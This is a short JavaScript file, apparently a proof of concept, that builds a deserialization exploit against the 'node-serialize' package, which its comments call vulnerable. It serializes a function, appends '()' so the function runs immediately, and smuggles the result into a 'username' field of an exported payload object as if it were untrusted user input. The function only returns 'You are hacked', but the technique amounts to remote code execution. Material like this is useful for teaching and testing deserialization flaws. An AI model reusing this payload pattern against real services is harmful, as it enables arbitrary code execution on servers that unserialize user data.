import serialize from 'node-serialize'; // Vulnerable package

const input = {
  myOutput: function () {
    return 'You are hacked';
  },
};

const serializedPayload = serialize.serialize(input);
console.log('Serialized: \n' + serializedPayload + '\n');

const payload = {
  // This field received a untrusted username
  // Leverage the JavaScript IIFE to the call function
  username: `${JSON.parse(serializedPayload).myOutput}()`,
  gender: 'Male',
  Age: 40,
};

// console.log(serialize.unserialize(payload));

export { payload };
